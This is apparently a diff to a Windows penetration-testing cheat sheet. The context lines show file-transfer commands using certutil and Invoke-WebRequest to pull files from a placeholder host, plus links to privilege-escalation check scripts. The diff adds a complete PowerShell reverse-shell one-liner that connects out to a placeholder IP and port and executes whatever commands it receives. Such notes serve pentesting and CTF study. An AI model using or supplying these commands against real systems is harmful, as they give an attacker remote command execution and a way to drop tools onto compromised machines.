@@ -7,6 +7,7 @@ certutil.exe -urlcache -split -f "http://ip:8000/archivo" archivo
 ```
 Invoke-WebRequest -Uri http://ip:8000/archivo -OutFile archivo
 ```
+
 ### SMB
 Local
 ```
@@ -24,4 +25,10 @@ https://github.com/pentestmonkey/windows-privesc-check/blob/master/windows-prive
 ### Python
 ```
 https://github.com/pentestmonkey/windows-privesc-check/blob/master/windows_privesc_check.py
+```
+
+### Reverse Shell
+#### Powershell
+```
+$client = New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
